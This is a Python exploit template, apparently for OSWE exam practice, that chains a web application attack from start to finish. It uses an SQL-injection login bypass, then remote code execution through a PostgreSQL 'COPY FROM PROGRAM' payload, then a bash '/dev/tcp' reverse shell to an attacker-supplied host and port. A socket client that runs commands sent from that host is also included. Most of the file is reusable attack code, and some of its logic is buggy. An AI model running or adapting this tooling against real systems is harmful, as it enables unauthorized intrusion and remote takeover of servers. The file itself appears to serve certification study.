#!/usr/bin/env python3

"""
OSWE Skeleton
You will need to set up yur webserver and your reverse shell

Step 1) Auth bypass
Step 2) RCE
Step 3) Reverse shell
"""

import sys
import requests
import argparse
import sys
import urllib.parse
from datetime import datetime
import socket
import subprocess
import threading
import time


# ─── Colors ────────────────────────────────────────────────────────
GREEN = '\033[0;32m'
RED = '\033[0;31m'
GREY = '\033[38;5;244m'
YELLOW = '\033[38;5;226m'
NC = '\033[0m'

"""
OSWE Exploit Skeleton
Steps: 1) Auth Bypass  2) RCE  3) Reverse Shell
"""
# ─── Argument Parsing ────────────────────────────────────────────────────────
def parse_args():
    global args
    parser = argparse.ArgumentParser(description="OSWE Exploit Skeleton")
    parser.add_argument("-t", "--target",   required=True,  help="Target base URL (e.g. http://192.168.1.10)")
    parser.add_argument("-l", "--lhost",    required=True,  help="Attacker IP for reverse shell")
    parser.add_argument("-p", "--lport",    required=True,  type=int,   help="Attacker port for reverse shell")
    parser.add_argument("--proxy",          action="store_true", default=False,  help="Enable Burp default proxies (8080)")
    parser.add_argument("--no-verify",      action="store_true", default=True,  help="Disable SSL verification")
    parser.add_argument("-d", "--debug",    action="store_true", default=False, help="Debug mode")

    args = parser.parse_args()
    return args

# ─── Session Setup ────────────────────────────────────────────────────────────
def build_session():
    s = requests.Session()
    s.verify = not args.no_verify
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    if args.proxy:
        s.proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
    return s

# ─── Logging Setup ────────────────────────────────────────────────────────────
class log():
    def _ts():
        return datetime.now().strftime("%H:%M:%S")

    def success(text):
        print(f"[{log._ts()}] [{GREEN}✓{NC}] {GREEN}{text}{NC}")

    def failure(text):
        print(f"[{log._ts()}] [{RED}✘{NC}] {RED}{text}{NC}")
        if args.debug:
            log.debug("Exiting ...")

    def info(text):
        print(f"[{log._ts()}] [{NC}*{NC}] {NC}{text}{NC}")

    def debug(text):
        if args.debug:
            print(f"{GREY}[{log._ts()}] [DEBUG] {GREY}{text}{NC}")

# ─── Reverse shell handler ───────────────────────────────────────────────────────────────
def reverse_shell_handler(lhost, lport):
    while True:
        try:
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((lhost, lport))
            log.success(f"[listener] Connected to: {lhost}:{lport}")
            
            # Send shell
            while True:
                try:
                    # Receive command
                    command = s.recv(1024).decode().strip()
                    log.debug(f"[listener] Command received: {command}")
                    if not command or command.lower() == 'exit':
                        break
                    
                    # Execute command and send output
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    log.debug(f"[listener] Command output: {output}")
                    s.send(output)
                    
                except subprocess.CalledProcessError as e:
                    s.send(f"Error: {str(e)}\n".encode())
                except:
                    break
                    
        except ConnectionRefusedError:
            log.failure("[listener] Connection refused, retrying...")
        except socket.gaierror:
            log.failure("[listener] Host not found, retrying...")
        except Exception as e:
            log.failure(f"[listener] Error: {e}")
        finally:
            try:
                s.close()
            except:
                pass
        
        # Wait before retrying
        time.sleep(5)
        log.info("[listener] Reconnecting...")

# ─── Start shell thread handler ────────────────────────────────────────────────────────
def start_shell(lhost, lport):
    """Start reverse shell in a background thread."""
    thread = threading.Thread(target=reverse_shell_handler, args=(lhost, lport))
    thread.daemon = True
    thread.start()
    return thread

#### Main Functions ####

# ─── Step 1: Auth Bypass ──────────────────────────────────────────────────────
def auth_bypass(session, target):
    log.info("Step 1: Attempting auth bypass...")

    url = f"{target}/login" # Example vulnerable endpoint

    data = { # Example data
        "username": "admin'-- -",
        "password": "anything",
    }

    r = session.get(url, data=data, allow_redirects=False)

    log.info(f"[step 1] POST {url} → {YELLOW}{r.status_code}{NC}")
    log.debug(f"[step 1] Response:\n {r.text[:200]}")

    if r.status_code in (200, 301, 302) or "home" in r.text.lower(): # The string 'home' is a placeholder, change it
        log.success("[step 1] Auth Bypass complete!")
        cookies = r.cookies.get_dict()
        log.debug(f"[step 1] Cookies: {cookies}")
        return cookies

    log.failure("[step 1] Auth Bypass failed")
    sys.exit(1)

# ─── Step 2: Remote Code Execution ───────────────────────────────────────────
def rce(session, cookies, target, cmd):
    log.info(f"Step 2: Attempting RCE with cmd: {YELLOW}{cmd}{NC}")

    url = f"{target}/uploads/shell.php" # Example vulnerable endpoint

    payload = f"0; COPY cmd_out FROM PROGRAM '{cmd}'" # Example SQL Payload
    r = session.get(f"{url}", params={"id": payload}, cookies=cookies)
    out = r.text

    log.info(f"[step 2] GET {url} → {YELLOW}{r.status_code}{NC}")
    log.debug(f"[step 2] Response:\n {r.text[:200]}")

    if r.status_code in (400, 404, 500) or "error" in r.text.lower(): # The string 'home' is a placeholder, change it
        log.failure(f"[step 2] RCE failed - Status code {r.status_code}")
        sys.exit(1) 

    if r.status_code == 200 or out:
        log.debug(f"[step 2] Output: {out}")
        log.success("[step 2] Step 2: RCE complete!")
        return out

    log.failure("[step 2] RCE failed")
    sys.exit(1)

# ─── Step 3: Reverse Shell ────────────────────────────────────────────────────
def reverse_shell(session, cookies, target, lhost, lport):
    log.info(f"Step 3: Attempting reverse shell to {lhost}:{lport}")

    shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" # Example payload
    log.debug(f"[step 3] Shell payload (raw): {shell}")

    # Encode to avoid bad characters
    encoded = urllib.parse.quote(shell)
    log.debug(f"[step 3] Shell payload (encoded): {encoded}")

    # Reuse the RCE vector — pass the shell command through it
    status = rce(session, cookies, target, shell)
    if status:
        log.success("[step 3] Reverse shell sent, watch your listener.")
    
    log.failure("[step 3] Reverse Shell failed")
    sys.exit(1)

    
# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    parse_args()
    session = build_session()
    target  = args.target.rstrip("/") # Remove final slash (/)

    log.info(f"Target: {target}")
    log.info(f"LHOST: {args.lhost}:{args.lport}")
    log.info(f"Proxy: {session.proxies if args.proxy else 'None'}")
    print("───────────────────────────────────────────────────────────────────────")

    # Step 1 — Auth bypass (populates session cookies)
    cookies = auth_bypass(session, target)

    # Step 2 — Verify RCE with a safe command (id/whoami)
    rce(session, cookies, target, "whoami")

    # Start listener in background
    #thread = start_shell(args.lhost, args.lport)
    #log.info(f"[step 3] Listener started in the background - ID {thread.ident}")
    #log.info(f"{YELLOW}Remember to set up your listener: nc -lvnp {args.lport}{NC}")
    #thread.join()  # Keep main thread alive

    # Step 3 — Pop shell
    reverse_shell(session, cookies, target, args.lhost, args.lport)

if __name__ == "__main__":
    main()